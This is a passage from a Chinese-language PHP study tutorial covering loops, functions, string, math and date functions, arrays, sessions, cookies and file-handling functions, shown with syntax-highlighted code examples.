class="comment">//任务二</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">  <span class="comment">//默认任务</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>循环结构</strong></p><p>在PHP中，while循环语句如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span>(条件)&#123; </span><br><span class="line">     <span class="comment">//执行任务</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>do…while循环语句语法如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">do</span>&#123; </span><br><span class="line">     <span class="comment">//执行任务</span></span><br><span class="line">&#125;<span class="keyword">while</span>(条件)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>while与do…while循环语句的区别是，while先判断条件是否成立，后执行循环，do...while先执行一次任务，再判断是否继续执行循环，也就是说do...while至少会执行一次任务。当条件为FALSE时，while中的任务会一次也不执行，do...while中的任务会执行1次</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    //A例子</span><br><span class="line">$num = 2;</span><br><span class="line">$sum  = 10; </span><br><span class="line">while($num&gt;3)&#123;</span><br><span class="line">$sum = $sum  + 10;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;A例子的结果：&quot;.$sum.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">//B例子</span><br><span class="line">$num = 2;</span><br><span class="line">$sum  = 10;</span><br><span class="line">do&#123;</span><br><span class="line">$sum = $sum  + 10;</span><br><span class="line">&#125;while($num&gt;3);</span><br><span class="line">echo &quot;B例子的结果：&quot;.$sum.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A例子的结果：<span class="number">10</span></span><br><span class="line">B例子的结果：<span class="number">20</span></span><br></pre></td></tr></table></figure><p>while和do…while可以根据具体情况选用。假设有一种棋类游戏，首先掷骰子，若不为6，前进骰子的点数的步长；若为6，前进骰子的点数的步长，并可以再掷一次。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//while例子</span></span><br><span class="line">$sum  = <span class="number">0</span>; </span><br><span class="line">$num = rand(<span class="number">1</span>,<span class="number">6</span>); <span class="comment">//获取1至6的随机数，模拟掷骰子</span></span><br><span class="line">$sum = $sum  + $num;<span class="comment">//前进步长</span></span><br><span class="line"><span class="keyword">while</span>($num==<span class="number">6</span>)&#123;</span><br><span class="line">$num = rand(<span class="number">1</span>,<span class="number">6</span>);<span class="comment">//获取1至6的随机数，模拟掷骰子</span></span><br><span class="line">$sum = $sum  + $num;<span class="comment">//前进步长</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"while例子执行完毕，前进："</span>.$sum .<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="comment">//do...while例子</span></span><br><span class="line">$sum  = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">$num = rand(<span class="number">1</span>,<span class="number">6</span>);<span class="comment">//获取1至6的随机数，模拟掷骰子</span></span><br><span class="line">$sum = $sum  + $num;<span class="comment">//前进步长</span></span><br><span class="line">&#125;<span class="keyword">while</span>($num==<span class="number">6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"do...while例子执行完毕，前进："</span>.$sum .<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>for循环语句结构如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(初始化;循环条件;递增项)&#123;</span><br><span class="line">      <span class="comment">//执行任务</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>在PHP中foreach循环语句，常用于遍历数组，一般有两种使用方式:不取下标、取下标。<br>（1）只取值，不取下标<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">foreach</span> (数组 <span class="keyword">as</span> 值)&#123;</span><br><span class="line"><span class="comment">//执行的任务</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>（2）同时取下标和值<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (数组 <span class="keyword">as</span> 下标 =&gt; 值)&#123;</span><br><span class="line"> <span class="comment">//执行的任务</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h4><p>实现特定功能的，可以重复执行的代码段</p><p>函数分为内置函数和用户函数</p><p><code>内置函数</code>是指PHP本身提供的各类库函数，如字符函数库/数学函数库等</p><p><code>用户函数</code>是指用户在程序中自定义的函数或方法</p><p>函数名定义规则：用正则表示：[a-zA-Z_\x7f-\xff]  [a-zA-Z0-9_\x7f-\xff]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testa</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">    &#123;代码段&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="函数的参数"><a href="#函数的参数" class="headerlink" title="函数的参数"></a>函数的参数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testa</span><span class="params">($i)</span> </span>&#123;</span><br><span class="line">    $i+=<span class="number">1</span>;    </span><br><span class="line">    <span class="keyword">echo</span> $i;</span><br><span class="line">&#125;</span><br><span class="line">testa(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><strong>函数的默认值</strong><br>给参数里的变量复制，就是参数的默认值<br>function testa($a=1, $b=2){<br>}<br><strong>值传递</strong><br>在函数内部修改变量的值的情况下，在函数调用时调用函数外部的变量，值不变</p><p><strong>引用传递</strong><br>在函数内部修改变量的值的情况下，在函数调用时，函数的参数前面加一个&amp;符号，值发生改变</p><p><strong>可变参数列表</strong><br>func_num_args(); 参数个数<br>func_get_arg();  返回一个参数，加数组的索引<br>func_get_args(); 返回参数数组<br><strong>参数的类型</strong><br>array    对象  callable</p><h4 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testa</span><span class="params">($i)</span> </span>&#123;</span><br><span class="line">    $i+=<span class="number">1</span>;    </span><br><span class="line">    <span class="keyword">return</span> $i; <span class="comment">//return后面的代码不执行</span></span><br><span class="line">&#125;</span><br><span class="line">$return = testa(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> $return;</span><br></pre></td></tr></table></figure><h4 id="函数的变量"><a href="#函数的变量" class="headerlink" title="函数的变量"></a>函数的变量</h4><h5 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h5><p><strong>局部动态变量</strong><br>变量旨在函数内部执行，执行完毕后被销毁</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testa</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $i=<span class="number">1</span>;    </span><br><span class="line">    $i++;    </span><br><span class="line">    <span class="keyword">echo</span> $i;</span><br><span class="line">&#125;</span><br><span class="line">testa();</span><br><span class="line">testa();</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><p><strong>局部动态变量</strong><br>在函数内部设置static，执行完毕后不被销毁<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testa</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $i=<span class="number">1</span>;    </span><br><span class="line">    $i++;    </span><br><span class="line">    <span class="keyword">echo</span> $i;</span><br><span class="line">&#125;</span><br><span class="line">testa();</span><br><span class="line">testa();</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure></p><h5 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h5><p>使用global在函数内部定义全局变量<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$i = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testa</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $i; </span><br><span class="line">    $i++;</span><br><span class="line">&#125;</span><br><span class="line">testa();</span><br><span class="line"><span class="keyword">echo</span> $i;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure></p><h4 id="复杂函数"><a href="#复杂函数" class="headerlink" title="复杂函数"></a>复杂函数</h4><p><strong>可变函数</strong><br>通过变量改变函数的名字并调用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>)&#123;</span><br><span class="line">    $fun = test1();</span><br><span class="line">    $fun;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $fun = test2();</span><br><span class="line">    $fun;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>函数的嵌套<br>在一个函数内在定义一个函数，调用时先嗲用外面的函数在调用里面的函数，注意变量的作用域，内部函数不可以执行外部函数内的变量</p><p><strong>递归调用</strong><br>自己调用自己，递归里面要有跳出这个递归的判断条件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fbnq</span><span class="params">($n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($n&lt;=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fbnq($n<span class="number">-1</span>) + fbnq($n<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> fbnq(<span class="number">6</span>);</span><br></pre></td></tr></table></figure></p><p><strong>匿名函数</strong><br>使用变量代替函数名，调用时也用变量加小括号来进行调用<br>声明一个匿名函数，用来以后做回调函数使用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="function"><span class="keyword">function</span> <span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">&#125;;</span><br><span class="line">$a(<span class="string">'hello'</span>);</span><br></pre></td></tr></table></figure></p><h4 id="系统函数库"><a href="#系统函数库" class="headerlink" title="系统函数库"></a>系统函数库</h4><h5 id="字符函数库"><a href="#字符函数库" class="headerlink" title="字符函数库"></a>字符函数库</h5><p><strong>字符串长度</strong><br>strlen<br><strong>字符串大小写转换</strong><br>strtoupper 全转换成大写<br>strtolower 全转换成小写<br>ucfirst 句子首字母转换成大写<br>ucwords 每个单词首字母转换成大写</p><p><strong>字符串替换函数</strong><br>str_replace<br>str_ireplace  不区分大小写</p><p><strong>字符串转换实体函数</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$str = <span class="string">"a&lt;b'\""</span>;</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars($str,ENT_QUOTES);</span><br></pre></td></tr></table></figure></p><p><strong>删除空格函数</strong></p><p>ltrim  rtrim trim函数<br><strong>字符串位置获取相关函数</strong><br>strpos<br>返回一个字符在另一个字符第一次出现的位置<br>stripos<br>同上，忽略大小写</p><p>strrpos<br>返回一个字符串在另一个字符串最后一次出现的位置<br>strripos<br>同上，忽略大小写</p><p><strong>字符串截取函数</strong></p><p>substr($str, 0, 4)<br>$str字符串<br>0 开始位置<br>4 截取长度</p><p>strstr<br>搜索一个字符串在另一个字符串中第一次出现的位置，返回字符串的其余部分</p><p>stristr<br>不区分大小写</p><p>strrchr<br>搜索字符串在另一个字符串中最后一次出现的位置，返回其余部分</p><p><strong>使用场景</strong><br>对于上传文件，如何获取文件名后缀，如 jpg<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$filename = <span class="string">'ab.cd.ef.jPg'</span>;</span><br><span class="line"></span><br><span class="line">$num = strrpos($filename, <span class="string">'.'</span>);   <span class="comment">// 首先获取'.'在最后一次出现的位置</span></span><br><span class="line"><span class="keyword">echo</span> strtolower(substr($filename, $num+<span class="number">1</span>));</span><br><span class="line"><span class="comment">// substr 截取$num+1到结尾的字符串</span></span><br><span class="line"><span class="comment">// strtolower 转换成小写</span></span><br></pre></td></tr></table></figure></p><p><strong>反转字符串</strong><br>strrev</p><p><strong>字符串加密函数</strong><br>md5</p><p><strong>打乱字符串</strong><br>str_shuffle</p><p><strong>使用场景</strong><br>验证码生成<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cap = <span class="string">'abcdefghigklmnopqrstuvwxyz'</span>;</span><br><span class="line"><span class="comment">//echo md5($cap);</span></span><br><span class="line"><span class="keyword">echo</span> substr(str_shuffle($cap),<span class="number">0</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure></p><p><strong>字符串分割</strong><br>拆分<br>explode<br>合并<br>implode<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$cap = <span class="string">'a|b|c|d'</span>;</span><br><span class="line"></span><br><span class="line">$arr = explode(<span class="string">'|'</span>, $cap);</span><br><span class="line">print_r($arr);</span><br><span class="line"></span><br><span class="line">$arr = implode(<span class="string">';'</span>,$arr);</span><br><span class="line"><span class="keyword">echo</span> $arr;</span><br></pre></td></tr></table></figure></p><p><strong>格式化字符串</strong><br>sprintf</p><blockquote><p> 函数  是可以重复执行/封装好的程序代码段</p></blockquote><h5 id="数学函数库"><a href="#数学函数库" class="headerlink" title="数学函数库"></a>数学函数库</h5><p><strong>进一/舍一取整</strong><br>floor<br>舍一取整<br>ceil<br>进一取整</p><p><strong>幂运算/平方根</strong><br>pow幂运算<br>pow(2, 3)   -&gt; 8<br>sqrt 平方根<br>sqrt(4)  -&gt; 2</p><p><strong>最大值/最小值</strong><br>max<br>min（至少需要2个或2个以上参数）</p><p><strong>随机数</strong><br>rand<br>mt_rand</p><p><strong>四舍五入</strong><br>round<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$num = <span class="string">'15.9015'</span>;</span><br><span class="line"><span class="keyword">echo</span> round($num, <span class="number">3</span>); <span class="comment">//3保留3位小数，不写为整数</span></span><br></pre></td></tr></table></figure></p><p><strong>数字格式化</strong><br>number_format<br>以千位分隔符方式格式化数字，使用方法同上</p><p><strong>浮点数余数</strong><br>fmod<br>fmod(7.8, 3)   -&gt; 1.8<br>7.8%3   -&gt; 1   //整数余数操作</p><h5 id="日期时间函数"><a href="#日期时间函数" class="headerlink" title="日期时间函数"></a>日期时间函数</h5><p><strong>格式化日期</strong><br>date<br>date(‘Y-m-d H:i:s ‘)<br><strong>时区修改</strong></p><p>date_default_timezone_get();<br>获取默认时区<br>date_default_timezone_set(‘Asia/Shanghai’);<br>设置默认时区，或修改php.ini文件中的date片段</p><p><strong>时间戳</strong></p><p>Unix时间戳，定义从格林威治时间1970年1月1日0时0分0秒起至现在的总秒数</p><p>time函数<br>86400 一天的秒数</p><p>strtotime 字符串转时间戳函数</p><p>strtotime(‘-3 weeks’);</p><p>microtime 函数 获取时间戳和微秒数，用途，某某程序运行时间<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$start = microtime(<span class="keyword">true</span>);</span><br><span class="line">$sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;<span class="number">100000</span>; $i++)&#123;</span><br><span class="line">    $sum += $i;</span><br><span class="line">&#125;</span><br><span class="line">$end = microtime(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"总共使用"</span>, round($end - $start,<span class="number">4</span>), <span class="string">"秒"</span>;</span><br></pre></td></tr></table></figure></p><p><strong>生成唯一ID</strong><br>uniqid<br>实际使用 uuid 8-4-4-4-12 = 32 位<br>md5(uniqid(microtime().mt_rand()))<br>除了随机数、时间戳，还可以加上网卡mac地址等</p><p><strong>获取日期、时间信息</strong><br>getdate函数</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>属于符合类型<br>数组实际上是一个有序映射<br>keys–values</p><h4 id="数组分类"><a href="#数组分类" class="headerlink" title="数组分类"></a>数组分类</h4><p>索引数组<br>数组的下标是数字<br>关联数组<br>数组的下标是字符</p><p>注意：都是根据键名找到对应的键值</p><h4 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h4><p>通过array()形式<br>通过[]动态创建<br>通过range()和compact()快速创建<br>通过define()定义常量数组</p><h4 id="使用数组"><a href="#使用数组" class="headerlink" title="使用数组"></a>使用数组</h4><p>通过键名找键值<br>通过键名进行增删查改</p><h4 id="标量类型转换为数组"><a href="#标量类型转换为数组" class="headerlink" title="标量类型转换为数组"></a>标量类型转换为数组</h4><p>临时转换<br>$var = 123;<br>$res=(array)$var;<br>var_dump($res);<br>永久转换<br>$var = 123;<br>settype($var,’array’);<br>var_dump($var);</p><h4 id="数组运算符"><a href="#数组运算符" class="headerlink" title="数组运算符"></a>数组运算符</h4><p>‘+’合并数组  如果数组键名相同，只会使用左边数组元素的值<br>‘==’ 比较数组的键名和键值是否相同，返回true或false<br>‘===’同上，顺序和类型也要相同<br>‘!= &lt;&gt; !==’ 取反</p><h4 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h4><p>通过foreach遍历数组<br>count 计算数组的长度<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$arr=[</span><br><span class="line"><span class="number">5</span>=&gt;<span class="string">'a'</span>,</span><br><span class="line"><span class="number">12</span>=&gt;<span class="string">'b'</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> $v)&#123;</span><br><span class="line"><span class="keyword">echo</span> $v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$arr=[</span><br><span class="line"><span class="number">5</span>=&gt;<span class="string">'a'</span>,</span><br><span class="line"><span class="number">12</span>=&gt;<span class="string">'b'</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> $key=&gt;$v)&#123;</span><br><span class="line"><span class="keyword">echo</span> $key, <span class="string">'--'</span>, $v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>foreach 用来遍历数组和对象，通过@符号无法抑制错误<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array($arr))&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $v)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>PHP7中foreach的改变</p><ul><li>foreach循环对数组内部指针不再起作用</li><li>按照值进行循环时，foreach是对该数组的值进行拷贝</li><li>按照引用进行循环时，在循环内修改数组对循环有影响</li></ul><h4 id="数组指针遍历数组"><a href="#数组指针遍历数组" class="headerlink" title="数组指针遍历数组"></a>数组指针遍历数组</h4><p>数组指针相关函数<br>key($array) 得到当前指针所在位置的键名，如果不存在，返回null<br>current($array)得到当前指针所在位置的键值，如果不存在，返回false<br>next($array) 将数组指针向下移动一位，并返回当前指针所在位置的键值，如果没有，返回false<br>prev($array)将数组指针向上移动一位，并返回当前指针所在位置的键值，如果没有，返回false<br>reset($array)将数组指针移动到数组开始，并返回当前指针所在位置的键值，如果没有，返回false<br>end($array)将数组指针移动到数组末尾，并返回当前指针所在位置的键值，如果没有，返回false</p><h3 id="会话控制"><a href="#会话控制" class="headerlink" title="会话控制"></a>会话控制</h3><p>session<br>用户在浏览某个网站时，从进入网站到浏览器关闭所经过的这段时间，也就是用户浏览这个网站所花费的时间，session是一个特定的时间概念</p><h4 id="为什么使用session"><a href="#为什么使用session" class="headerlink" title="为什么使用session"></a>为什么使用session</h4><ol><li><p>http协议是一种无状态的协议，同一客户端的本次请求和上次请求没有对应关系，http服务器并不知道这两个请求来自同一个客户端<br>优点：在于减轻服务器的压力<br>缺点：每次请求会传输大量重复的内容信息</p></li><li><p>session提供在PHP脚本中定义全局变量的方法，是的这个全局变量在同一个会话周期内对于所有的PHP脚本文件都有效，所以，session是基于http服务器的用户保持状态的方法</p></li><li>session允许通过将数据存储在http服务器中，已在整个用户会话过程中保持该数据，所以，session不仅是一个时间概念，还包括了特定的用户和服务器，以及特定的数据</li></ol><p>session的工作原理<br><img src="/php-study/session.png" title="描述"></p><p>会话标识符 sessionID<br>会话是由一个唯一标识符标识，可使用session_id函数读取此标识符，为PHP应用程序启用会话状态时，将检查应用程序中每个页面请求是否有浏览器发送的sessionID值，如果未提供任何sessionID值，则PHP将启动一个新会话，并将该会话的sessionID值随响应一起发送到浏览器</p><p>默认情况下，sessionID存储在cookie中</p><p>只要一直使用相同的sessionID值来发送请求，会话就被视为活动的，如果特定会话的请求间隔超过指定的超时值（默认1440秒，也就是24分钟），则该会话被视为已过期。如果使用过期的sessionID值发送的请求将会生成一个新的会话</p><h4 id="与session相关的函数"><a href="#与session相关的函数" class="headerlink" title="与session相关的函数"></a>与session相关的函数</h4><p>session_start()<br>启动新会话或者重用现有会话</p><p>session_id()<br>读取/设置sessionID<br>必须在调用session_start()函数之前调用session_id()函数</p><p>session_name()<br>读取/设置会话名称<br>必须在调用session_start()函数之前调用session_name()函数</p><p>session_destroy<br>销毁session会话</p><h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><p>用途：</p><ul><li>会话状态管理（如用户登陆状态/购物车等）</li><li>个性化设置（如用户自定义设置）</li><li>浏览器行为追踪（如跟踪分析用户行为）</li></ul><p>setcookie() 函数</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><h4 id="文件函数库"><a href="#文件函数库" class="headerlink" title="文件函数库"></a>文件函数库</h4><p><strong>文件信息相关函数</strong><br>filetype($filename)<br>filesize($filename)<br>filectime($filename) 文件创建时间<br>filemtime($filename)文件修改事件<br>fileatime($filename)文件最后访问时间<br>date(“Y/m/d H:i:s”, fileatime($filename))</p><p>检测文件是否可读/可写/可执行<br>is_readable()<br>is_writeable()<br>is_executable()</p><p>检测是否唯一个文件,，并且检测文件是否存在<br>if_file($filename)</p><p>文件路径相关的函数<br>pathinfo()<br>basename()<br>dirname()<br>file_exists() 检测文件目录是否存在</p><p><strong>文件操作的相关函数</strong><br>创建/删除/剪切/重命名/拷贝<br>touch($filename)<br>unlink($filename)<br>rename($filename, $newfilename)<br>copy($source, $dest)</p><p><strong>操作文件内容相关的函数</strong><br>fopen()<br>fread()<br>fgetc()  从文件指针中读取字符<br>fgets()  从文件指针中读取一行<br>fgetss() 从文件指针中读取一行并过滤HTML标记<br>ftell()<br>fseek()<br>feof() 检测文件指针是否到了文件结束的位置<br>rewind() 重置指针<br>ftruncate() 截断文件内容<br>fclose()<br>fwrite()<br>r+   覆盖写入<br>w   清空写入<br>a    追加写入<br>fput()</p><p><strong>csv格式文件操作</strong><br>fgetcsv()  返回一个数组<br>fputcsv()</p><p>file_get_contents() 读取内容<br>file_put_contents() 向文件中写入内容，覆盖之前的内容<br>写入数组，可以使用序列化/json方式写入</p><h4 id="类操作"><a href="#类操作" class="headerlink" title="类操作"></a>类操作</h4><p><strong>范围解析操作符 （::）</strong><br>范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是一对冒号，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 